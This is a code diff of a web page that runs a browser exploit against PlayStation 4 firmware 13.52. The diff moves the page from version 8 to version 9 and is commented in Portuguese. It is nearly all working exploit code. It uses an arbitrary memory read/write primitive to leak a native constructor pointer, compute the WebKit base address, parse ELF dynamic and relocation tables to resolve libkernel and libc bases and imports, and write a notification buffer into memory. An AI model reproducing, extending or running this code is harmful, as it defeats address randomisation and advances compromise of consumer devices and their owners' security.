@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 — v8)</title>
+<title>PS4 WebKit Exploit (13.52 — v9)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -22,7 +21,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 #st{font-size:12px;color:#bbb;flex:1}
 #bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
-#con{width:100%;max-width:720px;height:340px;background:#050508;
+#con{width:100%;max-width:720px;height:380px;background:#050508;
   border:1px solid #161825;border-radius:6px;overflow-y:auto;
   padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
 .i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
@@ -99,7 +98,6 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
-// Helper: subtrair de int64
 function int64Sub(a, val) {
   let lo = a.low - val;
   let hi = a.hi;
@@ -108,26 +106,153 @@ function int64Sub(a, val) {
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
-// RESOLUÇÃO DE BASES (v8 - baseada na v4, SEM scan para trás)
+// v9: Analisar __ps5NativeCtor PRIMEIRO, depois derivar base corretamente
 // ═════════════════════════════════════════════════════════════════════════════
 
-async function resolveAllBases(p, webkitBase) {
-  logH('PARSING ELF DO WEBKIT (v8)');
-  log('[dbg] webkitBase = 0x' + webkitBase.toString(16));
+async function resolveAllBases(p, ctorAddr) {
+  logH('ANÁLISE DO __ps5NativeCtor (v9)');
+  log('[dbg] ctorAddr = 0x' + ctorAddr.toString(16));
 
-  // ─── Passo 1: Verificar ELF magic ───
-  let magic;
-  try { magic = p.read4(webkitBase); }
-  catch(e) { log('[-] Segfault ao ler ELF magic', 'e'); return null; }
-
-  if (magic !== 0x464C457F) {
-    log('[-] magic inválido: 0x' + magic.toString(16), 'e');
+  // ─── Passo 1: Ler o que está em ctorAddr ───
+  let qword0, byte0, byte1;
+  try {
+    qword0 = p.read8(ctorAddr);
+    log('[+] read8(ctor) = 0x' + qword0.toString(16), 'ok');
+  } catch(e) {
+    log('[-] Não conseguiu ler __ps5NativeCtor: ' + e.message, 'e');
     return null;
   }
-  log('[+] ELF magic OK');
+
+  try {
+    byte0 = p.read1(ctorAddr);
+    byte1 = p.read1(ctorAddr.add32(1));
+    log('[+] bytes em ctor: ' + byte0.toString(16) + ' ' + byte1.toString(16));
+  } catch(e) {
+    log('[-] Erro lendo bytes: ' + e.message, 'e');
+  }
+
+  // ─── Passo 2: Determinar se é código ou objeto C++ ───
+  let isVtable = false;
+  let isCode = false;
+
+  if (qword0.hi >= 0x80 && qword0.hi <= 0x9F && (qword0.low & 0xF) === 0) {
+    // qword0 parece um ponteiro de módulo (vtable?)
+    log('[!] qword0 parece um ponteiro de módulo → provavelmente VTABLE');
+    isVtable = true;
+  } else if (byte0 === 0x55 || byte0 === 0x48 || byte0 === 0xE9 || byte0 === 0x41) {
+    log('[!] Primeiro byte indica CÓDIGO x86_64 → ctor aponta para função');
+    isCode = true;
+  } else {
+    log('[!] Não identificado como código nem vtable. byte0=0x' + (byte0 !== undefined ? byte0.toString(16) : '??'));
+  }
+
+  // ─── ESTRATÉGIA A: ctor é código → base = ctor - hc ───
+  if (isCode) {
+    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
+               ? OFFSET_wk_host_constructor_candidates[0]
+               : 0x36F9E20;
+    const baseVal = ctorAddr.hi * 0x100000000 + ctorAddr.low - hc;
+    const baseHi = Math.floor(baseVal / 0x100000000);
+    const baseLo = baseVal - baseHi * 0x100000000;
+    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);
+
+    log('[dbg] Estratégia A (código): base = ctor - 0x' + hc.toString(16) + ' = 0x' + webkitBase.toString(16));
+    return await parseElfFromBase(p, webkitBase);
+  }
+
+  // ─── ESTRATÉGIA B: ctor é objeto com vtable → base = vtable - vtableOffset ───
+  if (isVtable) {
+    log('[!] Estratégia B: objeto com vtable');
+    log('[dbg] Vtable = 0x' + qword0.toString(16));
+
+    // Tentar encontrar ELF magic varrendo para TRÁS a partir da vtable
+    // Mas com MUITO cuidado — limitar a 1MB e parar no primeiro erro
+    log('[dbg] Varrendo para trás da vtable (máx 1MB)...');
+    let foundBase = null;
+    for (let back = 0; back < 0x100000; back += 0x1000) {
+      try {
+        let test = int64Sub(qword0, back);
+        let magic = p.read4(test);
+        if (magic === 0x464C457F) {
+          foundBase = test;
+          log('[+] ELF magic encontrado em: 0x' + test.toString(16) +
+              ' (-0x' + back.toString(16) + ' da vtable)', 'ok');
+          break;
+        }
+      } catch(e) {
+        log('[-] Segfault em back=0x' + back.toString(16) + '. Parando scan.', 'e');
+        break;
+      }
+    }
+
+    if (foundBase) {
+      return await parseElfFromBase(p, foundBase);
+    } else {
+      log('[-] Não encontrou ELF próximo à vtable', 'w');
+    }
+  }
+
+  // ─── ESTRATÉGIA C: Tentar ambos e ver qual funciona ───
+  logH('ESTRATÉGIA C: Tentativa múltipla');
+
+  // Tentar A primeiro
+  const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
+             ? OFFSET_wk_host_constructor_candidates[0]
+             : 0x36F9E20;
+  const baseVal = ctorAddr.hi * 0x100000000 + ctorAddr.low - hc;
+  const baseHi = Math.floor(baseVal / 0x100000000);
+  const baseLo = baseVal - baseHi * 0x100000000;
+  const approxBase = new int64(baseLo >>> 0, baseHi >>> 0);
+
+  log('[dbg] Tentando approxBase = 0x' + approxBase.toString(16));
+  try {
+    let magic = p.read4(approxBase);
+    if (magic === 0x464C457F) {
+      log('[+] approxBase é ELF válido!', 'ok');
+      return await parseElfFromBase(p, approxBase);
+    } else {
+      log('[-] approxBase magic=0x' + magic.toString(16), 'w');
+    }
+  } catch(e) {
+    log('[-] approxBase causou erro: ' + e.message, 'e');
+  }
+
+  // Tentar a partir da vtable
+  if (isVtable) {
+    log('[dbg] Tentando a partir da vtable...');
+    try {
+      let magic = p.read4(qword0);
+      if (magic === 0x464C457F) {
+        log('[+] Vtable aponta direto para ELF!', 'ok');
+        return await parseElfFromBase(p, qword0);
+      }
+    } catch(e) {}
+
+    // Varredura controlada para trás
+    for (let back = 0; back < 0x400000; back += 0x1000) {
+      try {
+        let test = int64Sub(qword0, back);
+        let magic = p.read4(test);
+        if (magic === 0x464C457F) {
+          log('[+] ELF em: 0x' + test.toString(16), 'ok');
+          return await parseElfFromBase(p, test);
+        }
+      } catch(e) { break; }
+    }
+  }
+
+  log('[-] Todas as estratégias falharam', 'e');
+  return null;
+}
+
+// ═════════════════════════════════════════════════════════════════════════════
+// PARSING ELF (a partir de uma base conhecida válida)
+// ═════════════════════════════════════════════════════════════════════════════
+
+async function parseElfFromBase(p, webkitBase) {
+  logH('PARSING ELF (base=0x' + webkitBase.toString(16) + ')');
   setCard('c-wk', '0x' + webkitBase.toString(16));
 
-  // ─── Passo 2: Ler ELF header ───
   let e_phoff, e_phentsize, e_phnum;
   try {
     e_phoff = p.read8(webkitBase.add32(0x20));
@@ -141,13 +266,11 @@ async function resolveAllBases(p, webkitBase) {
   log('[dbg] e_phoff=0x' + e_phoff.toString(16) + ' e_phentsize=' + e_phentsize + ' e_phnum=' + e_phnum);
 
   if (e_phnum === 0 || e_phnum > 64) {
-    log('[-] e_phnum inválido: ' + e_phnum, 'w');
+    log('[-] e_phnum inválido', 'w');
     return null;
   }
 
   let phoff = webkitBase.add32(e_phoff.low);
-
-  // ─── Passo 3: Encontrar PT_DYNAMIC ───
   let dynamicVaddr_abs = null;
   let dynamicSize = 0;
 
@@ -155,48 +278,38 @@ async function resolveAllBases(p, webkitBase) {
     let phAddr = phoff.add32(i * e_phentsize);
     let p_type;
     try { p_type = p.read4(phAddr); }
-    catch(e) { log('[-] Segfault no phdr[' + i + ']', 'e'); return null; }
+    catch(e) { log('[-] Segfault phdr[' + i + ']', 'e'); return null; }
 
     if (p_type === 2) {
       let p_vaddr_rel, p_filesz;
       try {
         p_vaddr_rel = p.read8(phAddr.add32(0x10));
         p_filesz = p.read8(phAddr.add32(0x28));
-      } catch(e) {
-        log('[-] Segfault lendo PT_DYNAMIC', 'e');
-        return null;
-      }
+      } catch(e) { log('[-] Segfault PT_DYNAMIC', 'e'); return null; }
       dynamicSize = p_filesz.low;
       dynamicVaddr_abs = webkitBase.add32(p_vaddr_rel.low);
-      log('[+] PT_DYNAMIC: rel=0x' + p_vaddr_rel.toString(16) +
-          ' abs=0x' + dynamicVaddr_abs.toString(16) +
-          ' size=0x' + dynamicSize.toString(16));
+      log('[+] PT_DYNAMIC: abs=0x' + dynamicVaddr_abs.toString(16) + ' size=0x' + dynamicSize.toString(16));
       break;
     }
   }
 
   if (!dynamicVaddr_abs) {
-    log('[-] PT_DYNAMIC não encontrado', 'w');
-    return trySceFallback(p, webkitBase);
+    log('[-] Sem PT_DYNAMIC', 'w');
+    return null;
   }
 
-  // ─── Passo 4: Parsear dynamic section ───
+  // Parse dynamic
   let strtab_abs = null, symtab_abs = null, jmprel_abs = null, pltrelsz = 0;
   let dt_entries = 0;
-  const MAX_DT = 256;
 
-  for (let off = 0; off < dynamicSize && dt_entries < MAX_DT; off += 16) {
+  for (let off = 0; off < dynamicSize && dt_entries < 256; off += 16) {
     let entry = dynamicVaddr_abs.add32(off);
     let tag, val_raw;
     try {
       tag = p.read8(entry).low;
       val_raw = p.read8(entry.add32(8));
-    } catch(e) {
-      log('[-] Segfault no dynamic[' + dt_entries + ']', 'e');
-      return trySceFallback(p, webkitBase);
-    }
+    } catch(e) { log('[-] Segfault dynamic[' + dt_entries + ']', 'e'); return null; }
     dt_entries++;
-
     if (tag === 5)  strtab_abs = webkitBase.add32(val_raw.low);
     if (tag === 6)  symtab_abs = webkitBase.add32(val_raw.low);
     if (tag === 23) jmprel_abs = webkitBase.add32(val_raw.low);
@@ -204,24 +317,23 @@ async function resolveAllBases(p, webkitBase) {
     if (tag === 0)  break;
   }
 
-  log('[dbg] DT entries: ' + dt_entries);
-  log('[+] strtab=0x' + (strtab_abs ? strtab_abs.toString(16) : 'null'));
-  log('[+] symtab=0x' + (symtab_abs ? symtab_abs.toString(16) : 'null'));
-  log('[+] jmprel=0x' + (jmprel_abs ? jmprel_abs.toString(16) : 'null') + ' pltrelsz=' + pltrelsz);
+  log('[dbg] strtab=0x' + (strtab_abs ? strtab_abs.toString(16) : 'null') +
+      ' symtab=0x' + (symtab_abs ? symtab_abs.toString(16) : 'null') +
+      ' jmprel=0x' + (jmprel_abs ? jmprel_abs.toString(16) : 'null') +
+      ' pltrelsz=' + pltrelsz);
 
   if (!strtab_abs || !symtab_abs || !jmprel_abs || pltrelsz === 0) {
-    log('[-] Dynamic incompleta. Fallback SCE...', 'w');
-    return trySceFallback(p, webkitBase);
+    log('[-] Dynamic incompleta', 'w');
+    return null;
   }
 
-  // ─── Passo 5: Varredura RELA ───
+  // Varredura RELA
   let numRela = Math.floor(pltrelsz / 24);
-  log('[+] Varrendo ' + numRela + ' entradas RELA...');
-
   if (numRela > 10000 || numRela === 0) {
-    log('[-] numRela inválido (' + numRela + '). Fallback SCE...', 'w');
-    return trySceFallback(p, webkitBase);
+    log('[-] numRela inválido (' + numRela + ')', 'w');
+    return null;
   }
+  log('[+] Varrendo ' + numRela + ' entradas RELA...');
 
   let imports = {};
   for (let i = 0; i < numRela; i++) {
@@ -256,108 +368,21 @@ async function resolveAllBases(p, webkitBase) {
       imports[name] = { wkOffset: r_offset_rel, importPtr: importPtr };
     }
   }
-  log('[+] ' + Object.keys(imports).length + ' imports parseados');
+  log('[+] ' + Object.keys(imports).length + ' imports');
 
-  // ─── Passo 6: Logar úteis ───
   let useful = ['memset','memcpy','strcmp','strlen','pthread_create',
                 '__stack_chk_guard','sceKernelDlsym','sceKernelSendNotificationRequest',
                 'sceKernelGetpid','sceKernelUsleep'];
   for (let name of useful) {
     if (imports[name]) {
       let ip = imports[name].importPtr;
-      let wo = imports[name].wkOffset;
       let isSys = (ip.hi >= 0x80 && ip.hi <= 0x9F);
-      log('    ' + name + ': wkOff=0x' + wo.toString(16) +
-          ' ptr=0x' + ip.toString(16) +
-          ' sys=' + isSys, isSys ? 'd' : 'w');
+      log('    ' + name + ': off=0x' + imports[name].wkOffset.toString(16) +
+          ' ptr=0x' + ip.toString(16) + ' sys=' + isSys, isSys ? 'd' : 'w');
     }
   }
 
-  // ─── Passo 7: Resolver bases ───
-  let libkernelBase = null;
-  let libcBase = null;
-
-  function findElfBase(p, startPtr, maxBack) {
-    for (let back = 0; back < maxBack; back += 0x1000) {
-      try {
-        let test = int64Sub(startPtr, back);
-        if (p.read4(test) === 0x464C457F) {
-          return test;
-        }
-      } catch(e) { return null; }
-    }
-    return null;
-  }
-
-  let lkRef = imports['__stack_chk_guard'] || imports['sceKernelGetpid'] || imports['sceKernelUsleep'];
-  if (lkRef) {
-    let ptr = lkRef.importPtr;
-    log('[dbg] lkRef.ptr = 0x' + ptr.toString(16));
-    if (ptr.hi >= 0x80 && ptr.hi <= 0x9F) {
-      libkernelBase = findElfBase(p, ptr, 0x200000);
-      if (libkernelBase) {
-        log('[+] libkernel: 0x' + libkernelBase.toString(16), 'ok');
-        setCard('c-lk', '0x' + libkernelBase.toString(16));
-      } else {
-        log('[-] Scan libkernel falhou', 'w');
-      }
-    } else {
-      log('[-] lkRef fora do range: 0x' + ptr.toString(16), 'w');
-    }
-  } else {
-    log('[-] Nenhum import de libkernel', 'w');
-  }
-
-  if (imports['memset']) {
-    let ptr = imports['memset'].importPtr;
-    log('[dbg] memset.ptr = 0x' + ptr.toString(16));
-    if (ptr.hi >= 0x80 && ptr.hi <= 0x9F) {
-      libcBase = findElfBase(p, ptr, 0x200000);
-      if (libcBase) {
-        log('[+] libc: 0x' + libcBase.toString(16), 'ok');
-        setCard('c-lc', '0x' + libcBase.toString(16));
-      } else {
-        log('[-] Scan libc falhou', 'w');
-      }
-    } else {
-      log('[-] memset fora do range: 0x' + ptr.toString(16), 'w');
-    }
-  }
-
-  return { imports, libkernelBase, libcBase, webkitBase };
-}
-
-// ═════════════════════════════════════════════════════════════════════════════
-// FALLBACK SCE (scan controlado APENAS para frente, dentro do módulo)
-// ═════════════════════════════════════════════════════════════════════════════
-
-function trySceFallback(p, webkitBase) {
-  logH('FALLBACK: SCE IMPORT SCAN');
-  log('[!] Varrendo APENAS dentro do módulo WebKit (para frente)...');
-
-  let imports = {};
-  let candidates = [];
-  const MAX_SCAN = 0x800000; // 8MB para frente do base
-  let found = 0;
-
-  for (let off = 0; off < MAX_SCAN && found < 300; off += 0x8) {
-    let ptr;
-    try { ptr = p.read8(webkitBase.add32(off)); }
-    catch(e) { break; } // segfault — parar imediatamente
-
-    if (ptr.hi >= 0x80 && ptr.hi <= 0x9F && (ptr.low & 0xF) === 0) {
-      let b0;
-      try { b0 = p.read1(ptr); }
-      catch(e) { continue; }
-      if (b0 !== 0x00 && b0 !== 0xCC && b0 !== 0xFF) {
-        candidates.push({ off: off, ptr: ptr });
-        found++;
-      }
-    }
-  }
-
-  log('[+] ' + candidates.length + ' candidatos');
-
+  // Resolver bases
   let libkernelBase = null;
   let libcBase = null;
 
@@ -372,48 +397,27 @@ function trySceFallback(p, webkitBase) {
     return null;
   }
 
-  function countStubs(p, base) {
-    let count = 0;
-    for (let off = 0; off < 0x100000 && count < 50; off += 0x10) {
-      try {
-        if (p.read1(base.add32(off)) === 0x48 &&
-            p.read1(base.add32(off+1)) === 0xC7 &&
-            p.read1(base.add32(off+2)) === 0xC0 &&
-            p.read1(base.add32(off+7)) === 0x49 &&
-            p.read1(base.add32(off+8)) === 0x89 &&
-            p.read1(base.add32(off+9)) === 0xCA) {
-          count++;
-        }
-      } catch(e) { break; }
+  let lkRef = imports['__stack_chk_guard'] || imports['sceKernelGetpid'] || imports['sceKernelUsleep'];
+  if (lkRef) {
+    let base = findBase(p, lkRef.importPtr);
+    if (base) {
+      libkernelBase = base;
+      log('[+] libkernel: 0x' + base.toString(16), 'ok');
+      setCard('c-lk', '0x' + base.toString(16));
+    } else {
+      log('[-] libkernel não encontrada', 'w');
     }
-    return count;
   }
 
-  for (let cand of candidates) {
-    if (libkernelBase && libcBase) break;
-    try {
-      let base = findBase(p, cand.ptr);
-      if (!base) continue;
-
-      if (!libkernelBase) {
-        let stubs = countStubs(p, base);
-        if (stubs >= 10) {
-          libkernelBase = base;
-          log('[+] libkernel (' + stubs + ' stubs): 0x' + base.toString(16), 'ok');
-          setCard('c-lk', '0x' + base.toString(16));
-          continue;
-        }
-      }
-
-      if (!libcBase) {
-        let b0 = p.read1(base.add32(0x1000));
-        if (b0 !== null && b0 !== 0x00 && b0 !== 0xCC) {
-          libcBase = base;
-          log('[+] libc candidata: 0x' + base.toString(16), 'ok');
-          setCard('c-lc', '0x' + base.toString(16));
-        }
-      }
-    } catch(e) {}
+  if (imports['memset']) {
+    let base = findBase(p, imports['memset'].importPtr);
+    if (base) {
+      libcBase = base;
+      log('[+] libc: 0x' + base.toString(16), 'ok');
+      setCard('c-lc', '0x' + base.toString(16));
+    } else {
+      log('[-] libc não encontrada', 'w');
+    }
   }
 
   return { imports, libkernelBase, libcBase, webkitBase };
@@ -423,7 +427,7 @@ function trySceFallback(p, webkitBase) {
 // VALIDAÇÃO
 // ═════════════════════════════════════════════════════════════════════════════
 
-async function validateBases(p, libkernelBase, libcBase, imports) {
+function validateBases(p, libkernelBase, libcBase) {
   logH('VALIDANDO BASES');
   let valid = { libkernel: false, libc: false };
 
@@ -431,63 +435,24 @@ async function validateBases(p, libkernelBase, libcBase, imports) {
     try {
       let magic = p.read4(libkernelBase);
       if (magic === 0x464C457F) {
-        log('[✓] libkernel: ELF magic OK', 'ok');
+        log('[✓] libkernel: ELF OK', 'ok');
         valid.libkernel = true;
       } else {
-        log('[✗] libkernel: magic inválido (0x' + magic.toString(16) + ')', 'e');
+        log('[✗] libkernel: magic inválido', 'e');
       }
-    } catch(e) {
-      log('[✗] libkernel: erro ao ler magic', 'e');
-    }
+    } catch(e) { log('[✗] libkernel: erro', 'e'); }
   }
 
   if (libcBase) {
     try {
       let magic = p.read4(libcBase);
       if (magic === 0x464C457F) {
-        log('[✓] libc: ELF magic OK', 'ok');
+        log('[✓] libc: ELF OK', 'ok');
         valid.libc = true;
       } else {
-        log('[✗] libc: magic inválido (0x' + magic.toString(16) + ')', 'e');
+        log('[✗] libc: magic inválido', 'e');
       }
-    } catch(e) {
-      log('[✗] libc: erro ao ler magic', 'e');
-    }
-  }
-
-  if (libkernelBase && valid.libkernel) {
-    let foundStubs = 0;
-    for (let off = 0; off < 0x100000 && foundStubs < 50; off += 0x10) {
-      try {
-        if (p.read1(libkernelBase.add32(off)) === 0x48 &&
-            p.read1(libkernelBase.add32(off+1)) === 0xC7 &&
-            p.read1(libkernelBase.add32(off+2)) === 0xC0) {
-          let b7 = p.read1(libkernelBase.add32(off+7));
-          let b8 = p.read1(libkernelBase.add32(off+8));
-          let b9 = p.read1(libkernelBase.add32(off+9));
-          if (b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
-            foundStubs++;
-          }
-        }
-      } catch(e) { break; }
-    }
-    if (foundStubs >= 3) {
-      log('[✓] libkernel: ' + foundStubs + ' stubs', 'ok');
-    } else {
-      log('[✗] libkernel: poucos stubs (' + foundStubs + ')', 'w');
-      valid.libkernel = false;
-    }
-  }
-
-  if (libkernelBase) {
-    let aligned = (libkernelBase.low & 0xFFF) === 0;
-    log(aligned ? '[✓] libkernel: alinhada' : '[✗] libkernel: NÃO alinhada', aligned ? 'ok' : 'w');
-    if (!aligned) valid.libkernel = false;
-  }
-  if (libcBase) {
-    let aligned = (libcBase.low & 0xFFF) === 0;
-    log(aligned ? '[✓] libc: alinhada' : '[✗] libc: NÃO alinhada', aligned ? 'ok' : 'w');
-    if (!aligned) valid.libc = false;
+    } catch(e) { log('[✗] libc: erro', 'e'); }
   }
 
   return valid;
@@ -497,17 +462,17 @@ async function validateBases(p, libkernelBase, libcBase, imports) {
 // NOTIFICAÇÃO
 // ═════════════════════════════════════════════════════════════════════════════
 
-function prepareNotification(p, libkernelBase, imports, text) {
-  logH('PREPARANDO BUFFER DE NOTIFICAÇÃO');
+function prepareNotification(p, imports, text) {
+  logH('PREPARANDO NOTIFICAÇÃO');
 
   let notifyImport = imports['sceKernelSendNotificationRequest'];
   if (!notifyImport) {
-    log('[-] sceKernelSendNotificationRequest não encontrado nos imports!', 'e');
+    log('[-] sceKernelSendNotificationRequest não encontrado!', 'e');
     return null;
   }
 
   let notifyFunc = notifyImport.importPtr;
-  log('[+] Endereço alvo da API: 0x' + notifyFunc.toString(16));
+  log('[+] Target: 0x' + notifyFunc.toString(16));
 
   let encoder = new TextEncoder();
   let msgBytes = encoder.encode(text + '\x00');
@@ -522,8 +487,7 @@ function prepareNotification(p, libkernelBase, imports, text) {
   p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
   p.write4(backingStore.add32(0x10), msgBytes.length);
 
-  log('[+] Buffer alocado com sucesso em: 0x' + backingStore.toString(16), 'ok');
-
+  log('[+] Buffer: 0x' + backingStore.toString(16), 'ok');
   return { notifyFunc, requestBuffer: backingStore };
 }
 
@@ -537,7 +501,7 @@ async function main() {
   $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
   log('UA: ' + ua, 'd');
 
-  setStatus('Rodando exploit JSC (core.js)...', 'r');
+  setStatus('Rodando exploit JSC...', 'r');
   logH('EXPLOIT JSC (WebKit)');
 
   let carrier;
@@ -556,8 +520,8 @@ async function main() {
     return;
   }
 
-  log('[+] core.js: exploit JSC concluído!', 'ok');
-  setStatus('Instalando R/W arbitrário...', 'r');
+  log('[+] core.js: OK!', 'ok');
+  setStatus('Instalando R/W...', 'r');
   logH('INSTALANDO PRIMITIVA R/W (mem.js)');
 
   let p;
@@ -574,9 +538,9 @@ async function main() {
     return;
   }
 
-  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Mapeando bases com estabilidade...', 'r');
-  logH('MAPEAMENTO DA 13.52 (v8)');
+  log('[+] R/W instalado!', 'ok');
+  setStatus('Analisando ctor...', 'r');
+  logH('MAPEAMENTO 13.52 (v9)');
 
   const ctor = globalThis.__ps5NativeCtor;
   if (typeof ctor === 'number' && ctor > 0x100000000) {
@@ -584,81 +548,60 @@ async function main() {
     const lo = ctor - hi * 0x100000000;
     const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
 
-    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(16), 'a');
+    log('[+] __ps5NativeCtor: 0x' + ctorInt64.toString(16), 'a');
 
-    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
-               ? OFFSET_wk_host_constructor_candidates[0]
-               : 0x36F9E20;
+    // SEM setTimeout — chamar diretamente
+    const result = await resolveAllBases(p, ctorInt64);
+    if (!result) {
+      setStatus('Falha na resolução', 'e');
+      return;
+    }
 
-    const resolvedBaseVal = ctor - hc;
-    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
-    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
-    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);
+    const valid = validateBases(p, result.libkernelBase, result.libcBase);
 
-    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
-    setCard('c-wk', '0x' + webkitBase.toString(16));
+    if (!valid.libkernel) {
+      setCard('c-lk', 'Falha');
+      log('[-] libkernel não validou', 'e');
+    }
+    if (!valid.libc) {
+      setCard('c-lc', 'Falha');
+      log('[-] libc não validou', 'e');
+    }
 
-    setTimeout(async () => {
-      const result = await resolveAllBases(p, webkitBase);
-      if (!result) {
-        setStatus('Falha na resolução de bases', 'e');
-        return;
-      }
+    if (valid.libkernel) {
+      try {
+        const notif = prepareNotification(p, result.imports, 'Hello from PS4 13.52!');
+        if (notif) {
+          setCard('c-g', 'Pronto');
+          setStatus('Notificação pronta!', 'ok');
+          log('[✓] OK.', 'ok');
 
-      const imports = result.imports;
-      const libKernelBase = result.libkernelBase;
-      const libcBase = result.libcBase;
+          const cbox = document.getElementById('cbox');
+          cbox.style.display = 'block';
+          document.getElementById('c-out').textContent =
+              'WebKit Base     = 0x' + result.webkitBase.toString(16) + '\n' +
+              'libkernel Base  = 0x' + (result.libkernelBase ? result.libkernelBase.toString(16) : 'N/A') + '\n' +
+              'libSceLibc Base = ' + (result.libcBase ? '0x' + result.libcBase.toString(16) : 'N/A') + '\n' +
+              'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
+              'Função Target   = 0x' + notif.notifyFunc.toString(16);
 
-      const valid = await validateBases(p, libKernelBase, libcBase, imports);
-
-      if (!valid.libkernel) {
-        setCard('c-lk', 'Falha na validação');
-        log('[-] libkernel base não passou na validação', 'e');
-      }
-      if (!valid.libc) {
-        setCard('c-lc', 'Falha na validação');
-        log('[-] libc base não passou na validação', 'e');
-      }
-
-      if (valid.libkernel) {
-        try {
-          const notif = prepareNotification(p, libKernelBase, imports, 'Hello World from PS4 13.52!');
-          if (notif) {
-            setCard('c-g', 'Pronto');
-            setStatus('Buffer de notificação pronto!', 'ok');
-            log('[✓] Configuração de notificação concluída com sucesso.', 'ok');
-
-            const cbox = document.getElementById('cbox');
-            cbox.style.display = 'block';
-            document.getElementById('c-out').textContent =
-                'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
-                'libkernel Base  = 0x' + (libKernelBase ? libKernelBase.toString(16) : 'N/A') + '\n' +
-                'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
-                'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
-                'Função Target   = 0x' + notif.notifyFunc.toString(16) + '\n' +
-                'Notify Offset   = 0x' + (imports['sceKernelSendNotificationRequest'] ? imports['sceKernelSendNotificationRequest'].wkOffset.toString(16) : 'N/A');
-
-            logH('NOTIFICAÇÃO');
-            log('[+] Offset dinâmico de sceKernelSendNotificationRequest: 0x' + imports['sceKernelSendNotificationRequest'].wkOffset.toString(16), 'i');
-            log('[!] Execução nativa requer ROP chain ou JIT pivot (não implementado)', 'w');
-            log('[!] Status: userland R/W ativo. Kernel exploit necessário para execução real.', 'w');
-
-          } else {
-            setCard('c-g', 'Falha');
-            log('[-] Falha ao preparar buffer de notificação', 'e');
+          logH('NOTIFICAÇÃO');
+          if (result.imports['sceKernelSendNotificationRequest']) {
+            log('[+] Offset: 0x' + result.imports['sceKernelSendNotificationRequest'].wkOffset.toString(16), 'i');
           }
-        } catch (e) {
-          log('[-] Erro ao preparar buffer: ' + e.message, 'e');
+          log('[!] ROP não implementado', 'w');
         }
-      } else {
-        setCard('c-g', 'Falha LK');
-        log('[-] Não foi possível resolver a libkernel para o buffer.', 'e');
+      } catch (e) {
+        log('[-] Erro: ' + e.message, 'e');
       }
-    }, 1000);
+    } else {
+      setCard('c-g', 'Falha LK');
+      log('[-] libkernel não resolvida.', 'e');
+    }
 
   } else {
-    log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
-    setStatus('Erro ao capturar NativeCtor', 'e');
+    log('[-] __ps5NativeCtor inválido.', 'e');
+    setStatus('Erro NativeCtor', 'e');
   }
 }
 
